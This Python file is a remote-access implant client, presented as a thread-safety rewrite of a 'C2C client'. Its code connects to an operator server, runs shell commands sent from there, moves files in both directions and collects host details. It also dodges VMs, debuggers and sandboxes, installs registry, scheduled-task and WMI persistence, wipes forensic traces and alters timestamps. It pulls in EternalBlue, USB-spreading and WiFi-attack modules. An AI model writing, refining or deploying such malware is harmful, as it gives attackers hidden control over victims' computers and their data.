#!/usr/bin/env python3
"""
Thread-Safe C2C Client Implementation
Addresses critical thread safety vulnerabilities and race conditions identified in security analysis.
"""

import socket
import ssl
import json
import threading
import subprocess
import os
import sys
import time
import signal
import atexit
import weakref
import concurrent.futures
import logging
from datetime import datetime
from contextlib import contextmanager
from typing import Optional, Dict, Any, Set
import psutil

# Import utility modules (assuming they exist)
try:
    from utils.anti_vm import VMDetector
    from utils.code_obfuscation import Obfuscator
    from utils.crypto import CryptoManager
    from utils.memory_protection import MemoryProtector
    from utils.network_protection import NetworkProtector
    from utils.cert_pinning import CertificatePinner
    from utils.advanced_protection import ProcessProtector
    from payload.modules.persistence import Persistence
    from payload.modules.process_migration import ProcessMigrator
    from payload.modules.anti_forensics import AntiForensics
    from payload.modules.usb_spreading import USBSpreader, USBDataHarvester
    from payload.modules.eternalblue import EternalBlueExploit
    from payload.modules.wifi_attacks import WiFiAttackSuite
    from payload.modules.domain_fronting import DomainFronting
    from payload.modules.staged_delivery import StagedPayloadDelivery
    from payload.modules.advanced_persistence import AdvancedPersistence
except ImportError as e:
    print(f"Warning: Could not import some modules: {e}")
    # Create dummy classes for missing modules
    class DummyModule:
        def __getattr__(self, name):
            return lambda *args, **kwargs: None
    
    VMDetector = DummyModule()
    Obfuscator = DummyModule()
    CryptoManager = DummyModule()
    MemoryProtector = DummyModule()
    NetworkProtector = DummyModule()
    CertificatePinner = DummyModule()
    ProcessProtector = DummyModule()
    Persistence = DummyModule()
    ProcessMigrator = DummyModule()
    AntiForensics = DummyModule()
    USBSpreader = DummyModule()
    USBDataHarvester = DummyModule()
    EternalBlueExploit = DummyModule()
    WiFiAttackSuite = DummyModule()
    DomainFronting = DummyModule()
    StagedPayloadDelivery = DummyModule()
    AdvancedPersistence = DummyModule()

# Configure logging
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.NullHandler()]  # Silent by default for stealth
)

class ThreadSafeClient:
    """
    Thread-safe C2C client with comprehensive protection against race conditions.
    
    Key Improvements:
    - Thread-safe initialization and cleanup
    - Atomic operations for connection management
    - Proper resource cleanup with weak references
    - Emergency shutdown protection
    - Timeout-based operations to prevent hangs
    """
    
    def __init__(self, host='localhost', port=4444, max_retries=5):
        self.host = host
        self.port = port
        self.max_retries = max_retries
        self.connected = False
        self.session_key = None
        self.socket: Optional[socket.socket] = None
        
        # Thread safety infrastructure
        self._connection_lock = threading.RLock()
        self._cleanup_lock = threading.Lock()
        self._shutdown_event = threading.Event()
        self._operations_lock = threading.Lock()
        self._active_operations: Set[weakref.ref] = weakref.WeakSet()
        self._initialized = False
        self._emergency_cleanup_registered = False
        
        # Component references
        self._components = {}
        
        # Logger
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # Initialize components safely
        self._safe_initialize()
    
    def _safe_initialize(self):
        """Thread-safe initialization with proper error handling"""
        with self._operations_lock:
            if self._initialized:
                return
            
            try:
                # Initialize core components first
                self._initialize_core_components()
                
                # Environment check with proper error handling
                if not self._safe_environment_check():
                    self._safe_exit(1)
                    return
                
                # Setup stealth mode with error recovery
                self._safe_enable_stealth_mode()
                
                # Setup emergency cleanup handlers (only once)
                if not self._emergency_cleanup_registered:
                    self._setup_emergency_cleanup()
                    self._emergency_cleanup_registered = True
                
                self._initialized = True
                self.logger.info("Client initialized successfully")
                
            except Exception as e:
                self.logger.error(f"Initialization failed: {e}")
                self._safe_exit(1)
    
    def _initialize_core_components(self):
        """Initialize core components with error handling"""
        component_classes = {
            'crypto': CryptoManager,
            'memory_protector': MemoryProtector,
            'network_protector': NetworkProtector,
            'cert_pinner': CertificatePinner,
            'process_protector': ProcessProtector,
            'persistence': Persistence,
            'migrator': ProcessMigrator,
            'anti_forensics': AntiForensics,
            'usb_spreader': USBSpreader,
            'usb_harvester': USBDataHarvester,
            'eternalblue': EternalBlueExploit,
            'wifi_attacks': WiFiAttackSuite,
            'domain_fronting': DomainFronting,
            'staged_delivery': StagedPayloadDelivery,
            'advanced_persistence': AdvancedPersistence
        }
        
        for name, cls in component_classes.items():
            try:
                self._components[name] = cls()
                setattr(self, name, self._components[name])
            except Exception as e:
                self.logger.warning(f"Failed to initialize {name}: {e}")
                # Set dummy object to prevent AttributeError
                setattr(self, name, type('DummyComponent', (), {'__getattr__': lambda self, x: lambda *a, **k: None})())
    
    def _safe_environment_check(self) -> bool:
        """Thread-safe environment check with timeout"""
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(self._check_environment)
                return future.result(timeout=30)  # 30 second timeout
        except (concurrent.futures.TimeoutError, Exception) as e:
            self.logger.warning(f"Environment check failed or timed out: {e}")
            return False
    
    def _check_environment(self) -> bool:
        """Internal environment check"""
        try:
            vm_detector = VMDetector()
            
            # VM detection
            if hasattr(vm_detector, 'detect_vm') and vm_detector.detect_vm():
                return False
            
            # Debugger detection
            if hasattr(vm_detector, 'detect_debugger') and vm_detector.detect_debugger():
                return False
            
            # Sandbox detection
            if hasattr(vm_detector, 'detect_sandbox') and vm_detector.detect_sandbox():
                return False
            
            return True
            
        except Exception as e:
            self.logger.warning(f"Environment check error: {e}")
            return False
    
    def _safe_enable_stealth_mode(self):
        """Enable stealth mode with error recovery"""
        try:
            # Process hiding
            if hasattr(self.process_protector, 'hide_process'):
                self.process_protector.hide_process()
            
            # Persistence installation
            if hasattr(self.persistence, 'install_registry'):
                self.persistence.install_registry()
            if hasattr(self.persistence, 'install_task_scheduler'):
                self.persistence.install_task_scheduler()
            if hasattr(self.persistence, 'install_wmi'):
                self.persistence.install_wmi()
            
            # Anti-forensics setup
            if hasattr(self.anti_forensics, 'start_continuous_cleanup'):
                self.anti_forensics.start_continuous_cleanup(interval=600)
            if hasattr(self.anti_forensics, 'execute_cleanup'):
                self.anti_forensics.execute_cleanup(quick_mode=True)
            
            # Memory protection
            if hasattr(self.memory_protector, 'protect_memory'):
                self.memory_protector.protect_memory()
            
            self.logger.info("Stealth mode enabled")
            
        except Exception as e:
            self.logger.error(f"Stealth mode setup error: {e}")
    
    def _setup_emergency_cleanup(self):
        """Setup emergency cleanup handlers with thread safety"""
        try:
            # Signal handlers for emergency cleanup
            signal.signal(signal.SIGTERM, self._emergency_shutdown)
            signal.signal(signal.SIGINT, self._emergency_shutdown)
            
            # Atexit handler for normal termination
            atexit.register(self._cleanup_on_exit)
            
            self.logger.info("Emergency cleanup handlers registered")
            
        except Exception as e:
            self.logger.error(f"Failed to setup emergency cleanup: {e}")
    
    def _emergency_shutdown(self, signum, frame):
        """Thread-safe emergency shutdown handler"""
        try:
            # Atomic shutdown flag setting
            if not self._shutdown_event.is_set():
                self._shutdown_event.set()
                self.logger.critical(f"Emergency shutdown triggered by signal {signum}")
            
            # Execute cleanup in separate thread with timeout
            cleanup_thread = threading.Thread(target=self._execute_emergency_cleanup, daemon=True)
            cleanup_thread.start()
            cleanup_thread.join(timeout=10)  # 10 second timeout
            
            # Force exit
            os._exit(0)
            
        except Exception:
            # If anything fails, just exit immediately
            os._exit(1)
    
    def _execute_emergency_cleanup(self):
        """Execute emergency cleanup operations"""
        try:
            # Emergency cleanup
            if hasattr(self.anti_forensics, 'emergency_cleanup'):
                self.anti_forensics.emergency_cleanup()
            
            # Stop continuous cleanup
            if hasattr(self.anti_forensics, 'stop_continuous_cleanup'):
                self.anti_forensics.stop_continuous_cleanup()
            
            # Remove persistence
            if hasattr(self.persistence, 'remove_persistence'):
                try:
                    self.persistence.remove_persistence()
                except:
                    pass
            
            # Close network connections
            self._safe_disconnect()
            
        except Exception as e:
            self.logger.error(f"Emergency cleanup error: {e}")
    
    def _cleanup_on_exit(self):
        """Thread-safe cleanup on normal exit"""
        with self._cleanup_lock:
            try:
                if not self._shutdown_event.is_set():
                    self._shutdown_event.set()
                
                # Quick cleanup
                if hasattr(self.anti_forensics, 'execute_cleanup'):
                    self.anti_forensics.execute_cleanup(quick_mode=True)
                
                # Stop continuous processes
                if hasattr(self.anti_forensics, 'stop_continuous_cleanup'):
                    self.anti_forensics.stop_continuous_cleanup()
                
                # Clean network traces
                if hasattr(self.anti_forensics, 'cleanup_network_traces'):
                    self.anti_forensics.cleanup_network_traces()
                
                # Timestamp manipulation
                self._manipulate_critical_timestamps()
                
                # Disconnect safely
                self._safe_disconnect()
                
            except Exception as e:
                self.logger.error(f"Exit cleanup error: {e}")
    
    def _manipulate_critical_timestamps(self):
        """Manipulate timestamps of critical files"""
        try:
            critical_paths = [
                os.path.abspath(__file__),
                os.path.dirname(os.path.abspath(__file__))
            ]
            
            for path in critical_paths:
                try:
                    if hasattr(self.anti_forensics, 'manipulate_timestamps'):
                        self.anti_forensics.manipulate_timestamps(path)
                except Exception:
                    pass
                    
        except Exception:
            pass
    
    @contextmanager
    def _operation_context(self):
        """Context manager for tracking active operations"""
        operation_ref = weakref.ref(threading.current_thread())
        try:
            with self._operations_lock:
                self._active_operations.add(operation_ref)
            yield
        finally:
            with self._operations_lock:
                self._active_operations.discard(operation_ref)
    
    def connect(self) -> bool:
        """Thread-safe connection establishment"""
        if self._shutdown_event.is_set():
            return False
        
        with self._connection_lock:
            if self.connected:
                return True
            
            retry_count = 0
            while retry_count < self.max_retries and not self._shutdown_event.is_set():
                try:
                    with self._operation_context():
                        # Create SSL context
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        # Create socket with timeout
                        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.socket.settimeout(10.0)
                        
                        # Connect
                        self.socket.connect((self.host, self.port))
                        
                        # Wrap with SSL
                        self.socket = context.wrap_socket(self.socket)
                        
                        # Perform handshake
                        if self._perform_handshake():
                            self.connected = True
                            self.logger.info("Connected successfully")
                            return True
                        
                except Exception as e:
                    self.logger.warning(f"Connection attempt {retry_count + 1} failed: {e}")
                    self._safe_socket_close()
                    
                retry_count += 1
                if retry_count < self.max_retries:
                    time.sleep(min(2 ** retry_count, 10))  # Exponential backoff, max 10s
            
            self.logger.error("All connection attempts failed")
            return False
    
    def _perform_handshake(self) -> bool:
        """Perform secure handshake with server"""
        try:
            # Send client identification
            client_info = {
                'type': 'client_hello',
                'version': '2.0',
                'capabilities': ['file_transfer', 'shell', 'system_info']
            }
            
            self._send_secure_message(client_info)
            
            # Receive server response
            response = self._receive_secure_message()
            
            if response and response.get('type') == 'server_hello':
                self.session_key = response.get('session_key')
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Handshake failed: {e}")
            return False
    
    def _send_secure_message(self, message: Dict[str, Any]):
        """Send encrypted message to server"""
        try:
            # Encrypt message if crypto available
            if hasattr(self.crypto, 'encrypt'):
                encrypted_data = self.crypto.encrypt(json.dumps(message))
            else:
                encrypted_data = json.dumps(message).encode()
            
            # Send length header
            length = len(encrypted_data)
            self.socket.sendall(length.to_bytes(4, byteorder='big'))
            
            # Send encrypted data
            self.socket.sendall(encrypted_data)
            
        except Exception as e:
            self.logger.error(f"Send message failed: {e}")
            raise
    
    def _receive_secure_message(self) -> Optional[Dict[str, Any]]:
        """Receive and decrypt message from server"""
        try:
            # Receive length header
            length_data = self._receive_exact(4)
            if not length_data:
                return None
            
            length = int.from_bytes(length_data, byteorder='big')
            
            # Receive encrypted data
            encrypted_data = self._receive_exact(length)
            if not encrypted_data:
                return None
            
            # Decrypt message if crypto available
            if hasattr(self.crypto, 'decrypt'):
                decrypted_data = self.crypto.decrypt(encrypted_data)
                return json.loads(decrypted_data)
            else:
                return json.loads(encrypted_data.decode())
            
        except Exception as e:
            self.logger.error(f"Receive message failed: {e}")
            return None
    
    def _receive_exact(self, count: int) -> Optional[bytes]:
        """Receive exact number of bytes"""
        data = b''
        while len(data) < count:
            if self._shutdown_event.is_set():
                return None
            
            chunk = self.socket.recv(count - len(data))
            if not chunk:
                return None
            data += chunk
        
        return data
    
    def handle_connection(self):
        """Main connection handling loop with thread safety"""
        if not self.connect():
            return
        
        with self._operation_context():
            try:
                while self.connected and not self._shutdown_event.is_set():
                    # Set socket timeout for responsiveness
                    self.socket.settimeout(5.0)
                    
                    try:
                        # Receive command
                        command_data = self._receive_secure_message()
                        if not command_data:
                            break
                        
                        # Process command in thread pool
                        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                            future = executor.submit(self._process_command, command_data)
                            try:
                                response = future.result(timeout=30)  # 30 second timeout
                                if response:
                                    self._send_secure_message(response)
                            except concurrent.futures.TimeoutError:
                                self.logger.warning("Command processing timed out")
                                self._send_secure_message({'error': 'Command timeout'})
                    
                    except socket.timeout:
                        continue  # Normal timeout, continue loop
                    except Exception as e:
                        self.logger.error(f"Connection handling error: {e}")
                        break
            
            finally:
                self._safe_disconnect()
    
    def _process_command(self, command_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Process received command safely"""
        try:
            command = command_data.get('command')
            args = command_data.get('args', [])
            
            if command == 'shell':
                return self._execute_shell_command(args)
            elif command == 'file_upload':
                return self._handle_file_upload(command_data)
            elif command == 'file_download':
                return self._handle_file_download(command_data)
            elif command == 'system_info':
                return self._get_system_info()
            elif command == 'disconnect':
                self._shutdown_event.set()
                return {'status': 'disconnecting'}
            else:
                return {'error': f'Unknown command: {command}'}
        
        except Exception as e:
            self.logger.error(f"Command processing error: {e}")
            return {'error': str(e)}
    
    def _execute_shell_command(self, args: list) -> Dict[str, Any]:
        """Execute shell command safely"""
        try:
            if not args:
                return {'error': 'No command provided'}
            
            cmd = ' '.join(args)
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,  # 60 second timeout
                cwd=os.getcwd()
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {'error': 'Command execution timed out'}
        except Exception as e:
            return {'error': f'Command execution failed: {str(e)}'}
    
    def _handle_file_upload(self, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file upload from server"""
        try:
            filepath = command_data.get('filepath')
            content = command_data.get('content')
            
            if not filepath or content is None:
                return {'error': 'Invalid file upload data'}
            
            # Write file safely
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'wb') as f:
                f.write(content.encode() if isinstance(content, str) else content)
            
            return {'status': 'File uploaded successfully'}
            
        except Exception as e:
            return {'error': f'File upload failed: {str(e)}'}
    
    def _handle_file_download(self, command_data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file download to server"""
        try:
            filepath = command_data.get('filepath')
            
            if not filepath or not os.path.exists(filepath):
                return {'error': 'File not found'}
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            return {
                'content': content,
                'filepath': filepath,
                'size': len(content)
            }
            
        except Exception as e:
            return {'error': f'File download failed: {str(e)}'}
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get system information safely"""
        try:
            return {
                'hostname': socket.gethostname(),
                'platform': sys.platform,
                'architecture': os.uname().machine if hasattr(os, 'uname') else 'unknown',
                'python_version': sys.version,
                'pid': os.getpid(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
                'cwd': os.getcwd()
            }
        except Exception as e:
            return {'error': f'Failed to get system info: {str(e)}'}
    
    def _safe_disconnect(self):
        """Thread-safe disconnection"""
        with self._connection_lock:
            self.connected = False
            self._safe_socket_close()
    
    def _safe_socket_close(self):
        """Safely close socket"""
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            finally:
                self.socket = None
    
    def _safe_exit(self, code: int = 0):
        """Safe exit with proper cleanup"""
        try:
            self._shutdown_event.set()
            self._cleanup_on_exit()
        except Exception:
            pass
        finally:
            os._exit(code)
    
    def run(self):
        """Main execution method"""
        try:
            self.logger.info("Starting thread-safe client")
            self.handle_connection()
        except KeyboardInterrupt:
            self.logger.info("Interrupted by user")
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
        finally:
            self._safe_exit()

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Thread-Safe C2C Client')
    parser.add_argument('--host', default='localhost', help='Server host')
    parser.add_argument('--port', type=int, default=4444, help='Server port')
    parser.add_argument('--max-retries', type=int, default=5, help='Maximum connection retries')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger().addHandler(logging.StreamHandler())
    
    client = ThreadSafeClient(
        host=args.host,
        port=args.port,
        max_retries=args.max_retries
    )
    
    client.run()

if __name__ == '__main__':
    main()
